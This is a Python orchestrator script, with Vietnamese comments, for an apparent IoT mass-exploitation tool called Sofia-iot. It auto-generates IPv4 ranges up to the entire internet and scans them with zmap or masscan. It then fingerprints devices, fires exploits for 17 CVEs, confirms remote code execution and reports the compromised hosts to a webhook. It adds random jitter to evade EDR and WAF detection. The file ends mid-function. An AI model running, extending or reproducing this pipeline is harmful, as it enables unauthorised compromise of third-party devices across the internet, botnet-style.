# -*- coding: utf-8 -*-
"""
Sofia-iot — Orchestrator: điều phối pipeline 5 giai đoạn.

  Giai đoạn 0 — Discovery   : target_generator.generate() (zmap/masscan)
                              — hoặc đọc file targets.txt khi --no-discover.
                              NÂNG CẤP: khi SCAN_RANGES trống + AUTO_GEN_RANGES,
                              pipeline TỰ ĐỘNG SINH dải IPv4 /16 từ AUTO_GEN_CIDR
                              (mặc định 0.0.0.0/0 → 65536 dải /16, xáo thứ tự
                              theo seed), quét từng BATCH rồi ghi checkpoint.
  Giai đoạn 1 — Fingerprint : scanner.fingerprint() trên từng (IP, cổng mở),
                              hợp nhất với PORT_CVE_MAP theo cổng → danh sách CVE.
  Giai đoạn 2 — Exploit     : gọi module tương ứng trong exploits.REGISTRY
                              cho từng (host, cve); chọn cổng phù hợp.
  Giai đoạn 3 — Verify      : verifier.verify() xác nhận RCE (marker/'uid='
                              hoặc blind-check qua webroot).
  Giai đoạn 4 — Report      : ghi kết quả vào results/ + gửi webhook (finding,
                              tiến độ batch, summary).

Cách chạy (nâng cấp mới):
    python3 main.py --max-chunks 8 --batch 2        # tự sinh 8 dải /16, quét 2 dải/batch
    python3 main.py                                   # tự sinh toàn bộ IPv4 → /16, resume từ checkpoint
    python3 main.py --engines zmap                    # engine discovery (mặc định zmap)
    python3 main.py --engines masscan                 # engine masscan (quét cổng trực tiếp toàn dải)
    python3 main.py --no-resume                       # quét lại từ đầu
    python3 main.py --retry-failed                    # quét lại các dải lỗi
    python3 main.py --gen-cidr 203.0.113.0/16 --split-to 24   # chia dải nhỏ hơn để test
    python3 main.py --scan-range 192.0.2.0/24 --batch 1       # dải khai tay (vẫn có checkpoint)
    python3 main.py --no-discover --targets lab.txt --limit 50   # chế độ cũ: đọc targets.txt
    python3 main.py --webhook https://hook.example.com/x --notify-all

Engine "zmap" (mặc định — hybrid): zmap tự sinh/quét dải IPv4 để phát hiện host
số (cổng 80), rồi gửi danh sách host qua masscan (-iL) để quét cổng mở.
Engine "masscan": masscan quét SCAN_PORTS trực tiếp trên từng dải /16.

Mọi kết quả được lưu dưới results/ (findings.json, scan_summary.json,
fingerprints.json, state.json — checkpoint resume theo dải /16).
"""

import argparse
import ipaddress
import json
import logging
import os
import random
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import checkpoint
import target_generator
from config import (
    AUTO_GEN_CIDR,
    AUTO_GEN_MAX_CHUNKS,
    AUTO_GEN_SEED,
    AUTO_GEN_SHUFFLE,
    AUTO_GEN_SPLIT_TO,
    BATCH_SIZE,
    DISCOVER_MODE,
    EXPLOIT_JITTER,
    EXPLOIT_PER_HOST_LIMIT,
    FINGERPRINT_WORKERS,
    FP_PER_HOST_LIMIT,
    INTERNET_WIDE_HOSTS,
    MAX_TARGETS,
    NOTIFY_PROGRESS,
    POLITENESS_SLEEP_MAX,
    POLITENESS_SLEEP_MIN,
    RESULTS_DIR,
    STATE_FILE,
    THREADS,
    TIMEOUT,
)
from exploits import REGISTRY
from scanner import fingerprint, retry_call, tcp_connect
from target_generator import PORT_CVE_MAP
import report
import verifier
import webhook

log = logging.getLogger("sofia.main")

DEFAULT_TARGETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets.txt")


# ── Giai đoạn 0: nạp mục tiêu ───────────────────────────────────────────
def load_targets_file(path):
    """
    Đọc targets.txt → dict {ip: {"ports": [...], "cves": [...]}}.
    Cú pháp mỗi dòng:
      "IP"                  → cổng 80
      "IP:PORT"             → cổng chỉ định
      "IP:PORT:cve1,cve2"   → cổng + CVE gắn sẵn (lab: thiết bị giả lập
                              không có đủ dấu hiệu fingerprint)
      "CIDR"                → mở rộng thành từng IP (chỉ dải nhỏ)
    Dòng '#' là chú thích.
    """
    import ipaddress

    out = {}
    with open(path, encoding="utf-8") as fh:
        for raw in fh:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            try:
                if "/" in line:
                    net = ipaddress.ip_network(line, strict=False)
                    for ip in net.hosts():
                        out.setdefault(str(ip), {"ports": [80], "cves": []})
                    continue
                ip, sep, rest = line.partition(":")
                port = 80
                cves = []
                if sep:
                    port_s, _, cve_s = rest.partition(":")
                    port = int(port_s) if port_s else 80
                    cves = [c.strip() for c in cve_s.split(",") if c.strip()]
                entry = out.setdefault(ip, {"ports": [], "cves": set()})
                entry["ports"].append(port)
                entry["cves"].update(cves)
            except ValueError as exc:
                log.warning("Bỏ qua dòng targets không hợp lệ %r: %s", line, exc)
    out = {ip: {"ports": meta["ports"], "cves": sorted(meta["cves"])}
           for ip, meta in out.items()}
    log.info("Đã nạp %d mục tiêu từ %s", len(out), path)
    return out


# ── Giai đoạn 1: fingerprint → danh sách (host, port, cve) ──────────────
# Tên server header "generic" — host chỉ có tín hiệu server loại này (Apache/Nginx/
# IIS/httpd/Jetty) KHÔNG được gán CVE-by-port (PORT_CVE_MAP) để tránh bắn ~15 CVE
# không bằng chứng vào bất kỳ web server thường nào (dương giả hàng loạt).
_GENERIC_SERVER_NAMES = {"apache", "nginx", "iis", "httpd", "jetty"}


def _is_generic_webserver(info):
    """
    Generic webserver = TẤT CẢ tín hiệu fingerprint đều là `server:*` với tên
    trong _GENERIC_SERVER_NAMES. Danh sách signals rỗng → False (giữ hành vi
    chống bỏ sót cũ: fingerprint trống vẫn quét CVE-by-port).
    """
    signals = [s for s in (info.get("signals") or []) if s]
    if not signals:
        return False
    for s in signals:
        if not s.startswith("server:"):
            return False
        name = s.split(":", 1)[1].strip().lower()
        if name not in _GENERIC_SERVER_NAMES:
            return False
    return True


def stage1_fingerprint(targets, timeout=TIMEOUT):
    """
    Với mỗi IP: re-check cổng, chạy fingerprint để lấy candidates,
    hợp nhất với danh sách CVE theo cổng (PORT_CVE_MAP từ stage 0).

    SONG SONG HÓA (P0.4 UPGRADE_PROPOSAL): thay vòng `for ip` tuần tự bằng
    ThreadPoolExecutor FINGERPRINT_WORKERS worker; mỗi HOST giới hạn
    FP_PER_HOST_LIMIT task đồng thời (BoundedSemaphore) để không làm nghẽn
    thiết bị yếu khi host mở nhiều cổng. Kết quả gộp LẠI THEO THỨ TỰ GỐC
    (không đổi so với chạy tuần tự) → report/repro giữ ổn định.

    GATING: host fingerprint chỉ ra generic web server (apache/nginx/iis/httpd/jetty)
    sẽ KHÔNG được gán CVE-by-port — chỉ giữ candidates từ fingerprint thật và CVE
    gán sẵn trong targets.txt (lab override). Fingerprint trống/không xác định vẫn
    giữ CVE-by-port (chống bỏ sót). Kết quả gating ghi vào info["port_cve_gated"].

    Trả về (jobs, fingerprints):
      jobs        — list (host, port, cve_id) duy nhất theo (host, cve)
      fingerprints— list dict kết quả fingerprint (để ghi report)
    """
    jobs = {}            # (host, cve) -> (port, thông tin fingerprint)
    fingerprints = []

    # 1) Dựng danh sách task (ip, port) theo thứ tự ổn định như chạy tuần tự.
    tasks = []
    for ip, meta in targets.items():
        for port in sorted(set(meta.get("ports") or [80])):
            tasks.append((ip, port))

    # 2) Chạy tcp_connect + fingerprint song song; kết quả giữ nguyên vị trí.
    fp_results = [None] * len(tasks)
    per_host = {}          # semaphore riêng từng host

    def _fp_worker(idx):
        ip, port = tasks[idx]
        sem = per_host.setdefault(ip, threading.BoundedSemaphore(FP_PER_HOST_LIMIT))
        with sem:
            try:
                if not tcp_connect(ip, port, timeout=3):
                    return
                info = fingerprint(ip, port, timeout)
                info["candidates"] = sorted(info["candidates"])   # set → list cho JSON
                fp_results[idx] = (ip, port, info)
            except Exception as exc:
                log.debug("fingerprint %s:%d lỗi: %r", ip, port, exc)

    if tasks:
        with ThreadPoolExecutor(max_workers=FINGERPRINT_WORKERS) as pool:
            list(pool.map(_fp_worker, range(len(tasks))))

    # 3) Gộp kết quả theo thứ tự gốc (không phụ thuộc thứ tự hoàn thành).
    by_host = {}           # ip -> {port: info}
    for ip, port, info in (r for r in fp_results if r):
        by_host.setdefault(ip, {})[port] = info

    for ip, meta in targets.items():
        ports = meta.get("ports") or [80]
        cves_by_port = set(meta.get("cves") or [])
        found_any = False
        for port in sorted(set(ports)):
            info = by_host.get(ip, {}).get(port)
            if info is None:
                continue
            found_any = True
            fingerprints.append(info)
            # GATING: host generic-http (chỉ có tín hiệu server:apache/nginx/...)
            # không gán CVE-by-port — chống bắn CVE hàng loạt vào web server thường.
            generic = _is_generic_webserver(info)
            info["port_cve_gated"] = generic
            if generic:
                port_cves = []
                log.debug("Gating %s:%d — generic webserver (%s), bỏ CVE-by-port %s",
                          ip, port, ",".join(info["signals"]),
                          sorted(PORT_CVE_MAP.get(port, [])))
            else:
                port_cves = PORT_CVE_MAP.get(port, [])
            # Chống bỏ sót: candidates từ fingerprint + CVE gắn sẵn (targets.txt
            # vẫn là lab override) + CVE theo cổng (PORT_CVE_MAP, trừ generic).
            candidates = (set(info["candidates"])
                          | cves_by_port
                          | set(port_cves))
            for cve in candidates:
                if cve in REGISTRY:
                    jobs.setdefault((ip, cve), (port, info))
        if not found_any:
            log.debug("Bỏ qua %s: không cổng nào mở trong danh sách %s", ip, sorted(set(ports)))

    log.info("Giai đoạn 1 xong: %d fingerprint, %d (host, CVE) ứng viên khai thác",
             len(fingerprints), len(jobs))
    return jobs, fingerprints


# ── Giai đoạn 2+3: chọn cổng + khai thác + xác minh ─────────────────────
def resolve_port(host, cve_id, discovered_info, timeout=TIMEOUT):
    """
    Chọn cổng khai thác cho (host, cve):
      1. CVE fingerprint_only → dùng luôn cổng đã phát hiện (không gửi traffic).
      2. Cổng đã phát hiện mở nằm trong danh sách ports của CVE.
      3. Nếu không: thử từng cổng mặc định của CVE (tcp_connect).
      4. Cuối cùng: chính cổng đã phát hiện vẫn còn mở (hỗ trợ lab test
         trên cổng không chuẩn) — verifier tự loại trừ dương giả bằng marker.
    Trả về port hoặc None (không cổng nào khả dụng → bỏ qua).
    """
    info = REGISTRY[cve_id]
    disc_port, _ = discovered_info
    if info.get("fingerprint_only"):
        return disc_port
    if disc_port in info["ports"]:
        return disc_port
    for p in info["ports"]:
        if retry_call(tcp_connect, host, p, timeout=3)[0]:   # retry chống flaky
            return p
    if retry_call(tcp_connect, host, disc_port, timeout=3)[0]:
        return disc_port
    return None


def run_exploits(jobs, timeout=TIMEOUT, max_workers=THREADS):
    """
    Chạy (host, cve) song song: resolve cổng → verifier.verify().

    Rate-limit P0 — 0.2: nhiều host chạy song song (THREADS worker) nhưng mỗi
    HOST chỉ có tối đa EXPLOIT_PER_HOST_LIMIT task exploit/verify đồng thời
    (BoundedSemaphore) — không để 50 threads dồn toàn bộ CVE vào 1 thiết bị.
    Thêm jitter ngẫu nhiên trước mỗi probe để tránh burst đều nhịp dễ bị
    phát hiện (EDR/WAF theo pattern). Trả về list findings (dict JSON-serializable).
    """
    findings = []
    per_host_sem = {}

    def _verify_host(host, port, cve, info, to):
        sem = per_host_sem.setdefault(host, threading.BoundedSemaphore(EXPLOIT_PER_HOST_LIMIT))
        with sem:
            if EXPLOIT_JITTER > 0:
                time.sleep(random.uniform(0, EXPLOIT_JITTER))
            return verifier.verify(host, port, cve, REGISTRY[cve], to)

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {}
        for (host, cve), discovered_info in jobs.items():
            port = resolve_port(host, cve, discovered_info)
            if port is None:
                log.debug("Bỏ qua %s %s: không mở cổng khai thác", host, cve)
                continue
            fut = pool.submit(_verify_host, host, port, cve, discovered_info[1], timeout)
            futures[fut] = (host, cve, port, discovered_info[1])

        for fut in as_completed(futures):
            host, cve, port, info = futures[fut]
            try:
                result = fut.result()
            except Exception as exc:                     # verifier không raise, nhưng phòng hờ
                log.warning("Lỗi không mong đợi %s %s: %r", host, cve, exc)
                result = {"cve": cve, "host": host, "port": port,
                          "status": "ERROR", "evidence": repr(exc)[:200]}
            result.setdefault("name", REGISTRY[cve]["name"])
            result.setdefault("device", info.get("device", "Unknown"))
            result.setdefault("server", info.get("server", ""))
            result.setdefault("title", info.get("title", ""))
            result.setdefault("port_used", port)
            # WAF từ fingerprint (nếu verifier chưa phát hiện ở response exploit)
            if not result.get("waf"):
                result["waf"] = info.get("waf", "")
            findings.append(result)
            log.info("[%s] %s:%d → %s", cve, host, port, result["status"])
    return findings


# ── Giai đoạn 4: ghi report + webhook ───────────────────────────────────
def save_results(findings, fingerprints, stats, results_dir=RESULTS_DIR, tag=""):
    """
    Ghi findings.json, scan_summary.json, fingerprints.json vào results/.
    Nếu có `tag` (vd "batch_0001") → ghi thêm bản đánh dấu batch riêng:
      results/<tag>_findings.json, results/<tag>_fingerprints.json,
      results/<tag>_summary.json — giữ lịch sử từng batch khi quét nhiều dải.
    """
    os.makedirs(results_dir, exist_ok=True)
    base = {
        "findings": "findings.json",
        "summary": "scan_summary.json",
        "fingerprints": "fingerprints.json",
    }
    if tag:
        base = {k: "%s_%s" % (tag, v) for k, v in base.items()}
    paths = {}
    for key, fname in base.items():
        paths[key] = os.path.join(results_dir, fname)

    with open(paths["findings"], "w", encoding="utf-8") as fh:
        json.dump(findings, fh, ensure_ascii=False, indent=2)
    with open(paths["summary"], "w", encoding="utf-8") as fh:
        json.dump(stats, fh, ensure_ascii=False, indent=2)
    with open(paths["fingerprints"], "w", encoding="utf-8") as fh:
        json.dump(fingerprints, fh, ensure_ascii=False, indent=2)
    log.info("Đã ghi: %s, %s, %s", paths["findings"], paths["summary"], paths["fingerprints"])
    return paths


def summarize(findings, fingerprints=None):
    """Đếm kết quả theo trạng thái → dict cho scan_summary.json + console.

    Thống kê WAF gộp từ findings + fingerprints (dedupe theo host:port) để không
    mất thông tin "máy bị WAF chặn" khi WAF chặn sạch → 0 finding.
    """
    counts = {}
    for f in findings:
        counts[f["status"]] = counts.get(f["status"], 0) + 1
    confirmed = [f for f in findings if f["status"] == verifier.RCE_CONFIRMED]
    deterministic = [f for f in findings if f["status"] == verifier.CONFIRMED]
    # Thống kê WAF: số máy nghi bị WAF chặn (không kết luận nhầm "hết lỗ hổng")
    waf_hits = {}
    waf_total = 0
    seen = set()
    for f in findings:
        name = f.get("waf") or ""
        if name:
            key = (f["host"], f["port"])
            if key not in seen:
                seen.add(key)
                waf_hits[name] = waf_hits.get(name, 0) + 1
                waf_total += 1
    for fp in fingerprints or []:
        name = fp.get("waf") or ""
        if name:
            key = (fp.get("host"), fp.get("port"))
            if key not in seen:
                seen.add(key)
                waf_hits[name] = waf_hits.get(name, 0) + 1
                waf_total += 1
    return {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "total_findings": len(findings),
        "by_status": counts,
        "waf_detected": {"total": waf_total, "by_name": waf_hits},
        "rce_confirmed": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")}
            for f in confirmed
        ],
        # Xác nhận deterministic (không phải RCE exec) — vd: lộ credential/auth bypass
        "confirmed_deterministic": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")}
            for f in deterministic
        ],
    }, confirmed


def print_summary(stats, confirmed):
    """In bảng tóm tắt ra console."""
    print("\n" + "=" * 60)
    print("Sofia-iot — TÓM TẮT KẾT QUẢ")
    print("=" * 60)
    by = stats["by_status"]
    if not by:
        print("Không có kết quả nào được ghi nhận.")
    else:
        for status, n in sorted(by.items(), key=lambda kv: -kv[1]):
            print("  %-18s : %d" % (status, n))
    waf = stats["waf_detected"]
    if waf["total"]:
        print("\nWAF phát hiện (%d máy):" % waf["total"])
        for name, n in sorted(waf["by_name"].items(), key=lambda kv: -kv[1]):
            print("  - %-18s : %d" % (name, n))
    if confirmed:
        print("\nRCE ĐÃ XÁC NHẬN (%d):" % len(confirmed))
        for f in confirmed:
            print("  - %s  %s:%d  %s" % (f["cve"], f["host"], f["port"], f.get("evidence", "")[:90]))
    print("=" * 60)


# ── Pipeline 1 tập mục tiêu (dùng chung cho 1 batch /16 và chế độ cũ) ──
def run_pipeline(targets, tag="", notify=True):
    """
    Chạy giai đoạn 1→4 cho 1 tập mục tiêu (1 batch dải /16 hoặc toàn bộ):
      fingerprint → exploit+verify → lưu results → gửi webhook finding + summary.
    Trả về (findings, fingerprints, stats, confirmed).
    """
    jobs, fingerprints = stage1_fingerprint(targets)
    findings = run_exploits(jobs)
    stats, confirmed = summarize(findings, fingerprints)
    save_results(findings, fingerprints, stats, tag=tag)

    if notify and findings:
        sent = 0
        for f in findings:
            if webhook.notify(f) is not None:
                sent += 1
        log.info("Webhook: %d/%d finding đã gửi", sent, len(findings))
        webhook.notify_summary(stats)
    return findings, fingerprints, stats, confirmed


# ── Vòng lặp batch dải /16 (nâng cấp chính) ────────────────────────────
def politeness_sleep():
    """Ngủ ngẫu nhiên giữa 2 batch (chống chặn khi quét liên tục nhiều dải)."""
    delay = random.uniform(POLITENESS_SLEEP_MIN, POLITENESS_SLEEP_MAX)
    log.info("Politeness: ngủ %.1fs trước batch kế tiếp...", delay)
    time.sleep(delay)


def run_range_batches(ranges, gen_key, args):
    """
    Quét lần lượt từng BATCH dải /16:
      checkpoint (resume) → quét cổng (zmap/masscan) → fingerprint → exploit
      → verify → lưu results + webhook → đánh dấu xong → politeness.

    Trả về (all_findings, all_fingerprints, agg_stats, confirmed_all).
    """
    state = checkpoint.init_state(ranges, key=gen_key, path=args.state)
    done0, total = checkpoint.progress(state)
    if done0:
        log.info("Resume: %d/%d dải đã xong — bỏ qua, tiếp tục từ dải kế tiếp",
                 done0, total)
    if not checkpoint.pending_ranges(state, retry_failed=args.retry_failed):
        log.info("Không còn dải nào pending — pipeline đã hoàn tất (--no-resume để quét lại).")
        return [], [], {}, []

    batch_size = args.batch or BATCH_SIZE
    batch_total = max(1, (len(ranges) - done0 + batch_size - 1) // batch_size)
    batch_index = 0
    all_findings, all_fingerprints = [], []
    agg_counts = {}
    confirmed_all = []

    while True:
        batch = checkpoint.next_batch(state, batch_size, retry_failed=args.retry_failed)
        if not batch:
            break
        batch_index += 1
        done, total = checkpoint.progress(state)
        target_generator.SCAN_RANGES = batch

        if args.notify_progress:
            webhook.notify_phase("batch-start",
                                 "Bắt đầu batch %d/%d: %d dải /16 — %s"
                                 % (batch_index, batch_total, len(batch),
                                    ", ".join(batch)),
                                 {"batch_index": batch_index, "batch_total": batch_total,
                                  "done": done, "total": total})

        t_batch = time.time()
        log.info("=== BATCH %d/%d: %d dải /16 (%s) ===",
                 batch_index, batch_total, len(batch), ", ".join(batch))
        targets = target_generator.generate()
        if not targets:
            log.warning("Batch %d: discovery không tìm thấy mục tiêu nào", batch_index)
            checkpoint.mark_done(state, batch)          # dải đã quét xong (0 IP live)
            checkpoint.save_state(state, args.state)
            continue

        findings, fingerprints, stats, confirmed = run_pipeline(
            targets, tag="batch_%04d" % batch_index)
        all_findings.extend(findings)
        all_fingerprints.extend(fingerprints)
        confirmed_all.extend(confirmed)
        for k, v in stats["by_status"].items():
            agg_counts[k] = agg_counts.get(k, 0) + v

        checkpoint.mark_done(state, batch, stats={
            "total_findings": len(findings),
            "rce_confirmed": len(confirmed),
        })
        checkpoint.save_state(state, args.state)

        if args.notify_progress:
            webhook.notify_phase("batch-done",
                                 "Xong batch %d/%d: %d target, %d finding, %d RCE — %.0fs"
                                 % (batch_index, batch_total, len(targets),
                                    len(findings), len(confirmed), time.time() - t_batch),
                                 {"batch_index": batch_index, "batch_total": batch_total,
                                  "done": len(state.get("completed", [])), "total": total,
                                  "findings": len(findings), "rce": len(confirmed)})

        if checkpoint.pending_ranges(state, retry_failed=args.retry_failed):
            politeness_sleep()

    # Gộp toàn bộ batch → dedup toàn pipeline theo (host, cve, port) rồi
    # ghi findings_all.json + summary cuối + report.html/report.csv (P1 — 1.5).
    # Host có thể trùng qua nhiều batch (dải /16 chồng lấn hoặc lặp khi resume),
    # nên dedup ở đây là cần thiết để report không phình số liệu.
    all_findings = report.dedup_findings(all_findings)
    agg_counts = {}
    for f in all_findings:
        agg_counts[f["status"]] = agg_counts.get(f["status"], 0) + 1
    confirmed_all = [f for f in all_findings if f["status"] == verifier.RCE_CONFIRMED]
    done, total = checkpoint.progress(state)
    agg_stats = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "mode": "auto-gen /16",
        "ranges_done": done,
        "ranges_total": total,
        "batches_done": batch_index,
        "total_findings": len(all_findings),
        "by_status": agg_counts,
        "rce_confirmed": [
            {"cve": f["cve"], "host": f["host"], "port": f["port"],
             "evidence": f.get("evidence", "")} for f in confirmed_all
        ],
    }
    os.makedirs(RESULTS_DIR, exist_ok=True)
    with open(os.path.join(RESULTS_DIR, "findings_all.json"), "w",
              encoding="utf-8") as fh:
        json.dump(all_findings, fh, ensure_ascii=False, indent=2)
    with open(os.path.join(RESULTS_DIR, "summary_all.json"), "w",
              encoding="utf-8") as fh:
        json.dump(agg_stats, fh, ensure_ascii=False, indent=2)
    log.info("Đã ghi findings_all.json (%d finding, dedup) + summary_all.json",
             len(all_findings))
    # P1 — 1.5: sinh report.html + report.csv (severity CVSS + dedup)
    try:
        report.generate_report(
            all_findings,
            extra_meta={"source": os.path.join(RESULTS_DIR, "findings_all.json"),
                        "mode": agg_stats.get("mode", ""),
                        "ranges_done": "%s/%s" % (done, total)})
    except Exception as exc:
        log.warning("Không sinh được report HTML/CSV: %r", exc)
    return all_findings, all_fingerprints, agg_stats, confirmed_all


# ── Guardrail P0 — 0.1 (fail-closed internet-wide) ─────────────────────
def estimate_plan_hosts(ranges):
    """Tổng số địa chỉ IP mà kế hoạch sẽ quét (tổng num_addresses từng dải)."""
    total = 0
    for r in ranges:
        try:
            total += ipaddress.ip_network(r, strict=False).num_addresses
        except ValueError:
            total += 1
    return total


def print_plan(args, ranges, plan_hosts, use_auto, gen_key):
    """In kế hoạch quét rồi thoát (--dry-run) — không bắn bất kỳ request nào.

    Hiển thị: nguồn dải, số dải / tổng host dự kiến, engine, cổng, blacklist
    áp dụng, và lời nhắc --confirm-internet-wide nếu vượt ngưỡng.
    """
    blk = target_generator.BLACKLIST_FILE
    n_blk = 0
    if blk and os.path.exists(blk):
        with open(blk, encoding="utf-8", errors="ignore") as fh:
            n_blk = sum(1 for ln in fh if ln.strip() and not ln.lstrip().startswith("#"))
    src = "auto-gen /%d từ %s" % (gen_key.get("split_to"), gen_key.get("cidr")) \
        if use_auto else "khai tay"
    print("=" * 66)
    print("Sofia-iot — DRY-RUN: kế hoạch quét (không có request nào được gửi)")
    print("=" * 66)
    print("Nguồn dải        : %s" % src)
    print("Số dải           : %d" % len(ranges))
    print("Host dự kiến     : %d" % plan_hosts)
    print("Engine discovery : %s (cổng %s)" % (
        target_generator.ENGINE, ",".join(map(str, getattr(target_generator, "SCAN_PORTS", [80])))))
    print("Blacklist áp dụng: %s (%d dòng)" % (blk, n_blk))
    print("Tham số khác     : batch=%d, max_chunks=%s, seed=%s, shuffle=%s" % (
        args.batch or BATCH_SIZE, getattr(args, "max_chunks", None) or 0,
        gen_key.get("seed"), gen_key.get("shuffle")))
    if plan_hosts > INTERNET_WIDE_HOSTS:
        print("-" * 66)
        print("CẢNH BÁO: kế hoạch vượt ngưỡng internet-wide (%d host)." % INTERNET_WIDE_HOSTS)
        print("Để chạy thật, phải thêm: --confirm-internet-wide")
    print("=" * 66)


def guard_internet_wide(args, plan_hosts):
    """
    Fail-closed: nếu kế hoạch vượt ngưỡng INTERNET_WIDE_HOSTS mà không có
    --confirm-internet-wide → trả về mã lỗi 2 (dừng, không quét).
    """
    if plan_hosts > INTERNET_WIDE_HOSTS and not args.confirm_internet_wide:
        log.error(
            "Kế hoạch quét %d host vượt ngưỡng internet-wide (%d) — bắt buộc "
            "--confirm-internet-wide để chạy. --dry-run để xem kế hoạch trước.",
            plan_hosts, INTERNET_WIDE_HOSTS)
        return False
    return True


# ── CLI ─────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="Sofia-iot — pipeline quét & khai thác lỗ hổng thiết bị IoT "
                    "(17 CVE) — auto-generate dải IPv4 /16 + webhook")
    # Chế độ cũ
    p.add_argument("--no-discover", action="store_true",
                   help="Bỏ qua zmap/masscan — đọc file targets (mặc định targets.txt)")
    p.add_argument("--targets", default=DEFAULT_TARGETS_FILE,
                   help="File danh sách mục tiêu thay thế (dùng với --no-discover)")
    p.add_argument("--limit", type=int, default=MAX_TARGETS,
                   help="Giới hạn số mục tiêu xử lý MỖI BATCH (mặc định %d)" % MAX_TARGETS)
    p.add_argument("--ports", default=None,
                   help="Override SCAN_PORTS (VD '80,8080,37215')")
    p.add_argument("--engines", dest="engines", choices=["zmap", "masscan"],
                   default=None,
                   help="Engine discovery: zmap (mặc định — phát hiện host + masscan quét cổng) "
                        "hoặc masscan (quét cổng trực tiếp). Ghi đè config.DISCOVER_ENGINE.")
    # Dải quét: khai tay hoặc tự sinh
    p.add_argument("--scan-range", default=None,
                   help="Dải CIDR khai tay (VD '192.0.2.0/24' hoặc '10.0.0.0/8,192.0.2.0/24'). "
                        "Nếu để trống + AUTO_GEN_RANGES → tự sinh dải /16.")
    p.add_argument("--gen-ranges", action="store_true",
                   help="Bật auto-generate dải IPv4 /16 (kể cả khi --scan-range không dùng)")
    p.add_argument("--gen-cidr", default=None,
                   help="Dải gốc để chia (override AUTO_GEN_CIDR, VD '0.0.0.0/0')")
    p.add_argument("--split-to", type=int, default=None,
                   help="Chia chunk /N (override AUTO_GEN_SPLIT_TO, mặc định 16)")
    p.add_argument("--gen-seed", type=int, default=None,
                   help="Seed xáo thứ tự dải (override AUTO_GEN_SEED; 0 = ngẫu nhiên)")
    p.add_argument("--no-shuffle", action="store_true",
                   help="Không xáo thứ tự dải /16 (quét tuần tự từ đầu)")
    p.add_argument("--max-chunks", type=int, default=None,
                   help="Giới hạn số dải /16 sinh ra (0 = tất cả; VD 8 = test nhanh)")
    p.add_argument("--force-ranges", action="store_true",
                   help="Sinh lại dải /16 (bỏ qua cache ranges.json)")
    # Guardrail P0 — 0.1
    p.add_argument("--dry-run", action="store_true",
                   help="In kế hoạch quét (dải → số host → blacklist) rồi thoát, "
                        "không bắn bất kỳ request nào")
    p.add_argument("--confirm-internet-wide", action="store_true",
                   help="Xác nhận CHỦ ĐÍCH quét khi kế hoạch vượt ngưỡng "
                        "INTERNET_WIDE_HOSTS (mặc định ~/8). Cần thiết cho "
                        "AUTO_GEN_CIDR=0.0.0.0/0 mặc định.")
    # Batch + resume
    p.add_argument("--batch", type=int, default=None,
                   help="Số dải /16 mỗi batch (override BATCH_SIZE, mặc định %d)" % BATCH_SIZE)
    p.add_argument("--state", default=STATE_FILE,
                   help="File checkpoint/resume (mặc định %s)" % STATE_FILE)
    p.add_argument("--no-resume", action="store_true",
                   help="Quét lại từ đầu (bỏ qua completed trong state)")
    p.add_argument("--retry-failed", action="store_true",
                   help="Đưa các dải bị lỗi (failed) quay lại hàng đợi")
    # Webhook
    p.add_argument("--webhook", default=None,
                   help="Override WEBHOOK_URL (hoặc dùng env SOFIA_WEBHOOK_URL)")
    p.add_argument("--notify-all", action="store_true",
                   help="Gửi webhook cả trường hợp không xác nhận được RCE")
    p.add_argument("--notify-progress", action="store_true",
                   help="Gửi webhook tiến độ batch (bắt đầu/hoàn tất/summary)")
    p.add_argument("--no-notify-progress", action="store_true",
                   help="Tắt webhook tiến độ batch")
    # Khác
    p.add_argument("--allow-private", action="store_true",
                   help="Không lọc IP riêng (dùng khi test lab nội bộ)")
    p.add_argument("-v", "--verbose", action="store_true", help="Log chi tiết (DEBUG)")
    return p.parse_args()


def main():
    args = parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)-7s %(name)s | %(message)s",
    )

    if args.ports:
        ports = [int(x) for x in args.ports.split(",") if x.strip()]
        target_generator.SCAN_PORTS = ports
    if args.engines:
        target_generator.set_engine(args.engines)
        log.info("Engine discovery từ CLI --engines: %s", target_generator.ENGINE)
    if args.scan_range:
        target_generator.SCAN_RANGES = [x.strip() for x in args.scan_range.split(",") if x.strip()]
        log.info("Dải quét khai tay: %s", target_generator.SCAN_RANGES)
    if args.allow_private:
        target_generator.ALLOW_PRIVATE = True
    if args.webhook:
        webhook.WEBHOOK_URL = args.webhook
    if args.notify_all:
        webhook.NOTIFY_ALL = True
    notify_progress = (NOTIFY_PROGRESS and not args.no_notify_progress) \
        or args.notify_progress
    args.notify_progress = notify_progress

    t0 = time.time()

    # ── Giai đoạn 0: nguồn mục tiêu ────────────────────────────────────
    # Guardrail P0 — 0.1: --dry-run không bắn bất kỳ request nào.
    if args.dry_run and args.no_discover:
        targets = load_targets_file(args.targets)
        print("=" * 66)
        print("Sofia-iot — DRY-RUN: targets.txt (không có request nào được gửi)")
        print("=" * 66)
        print("File targets   : %s" % args.targets)
        print("Số mục tiêu    : %d (limit=%d)" % (len(targets), args.limit))
        print("=" * 66)
        return 0

    # Chế độ cũ: --no-discover → đọc targets.txt (không dùng zmap, không batch)
    if args.no_discover:
        targets = load_targets_file(args.targets)
        if args.limit and len(targets) > args.limit:
            log.warning("Giới hạn %d mục tiêu (đang có %d)", args.limit, len(targets))
            targets = dict(list(targets.items())[:args.limit])
        findings, _fps, stats, confirmed = run_pipeline(targets, tag="manual")
        if args.notify_progress:
            webhook.notify_summary(stats)
        print_summary(stats, confirmed)
        if findings:
            report.generate_report(
                findings, extra_meta={"source": args.targets, "mode": "targets.txt"})
        log.info("Pipeline hoàn tất trong %.1fs — %d mục tiêu, %d finding",
                 time.time() - t0, len(targets), len(findings))
        return 0

    # ── Chế độ discovery: dải khai tay HOẶC tự sinh /16 ───────────────
    gen_key = {}
    ranges = []
    manual = bool(target_generator.SCAN_RANGES)
    use_auto = (not manual and DISCOVER_MODE) or args.gen_ranges

    if use_auto:
        split_to = args.split_to or AUTO_GEN_SPLIT_TO
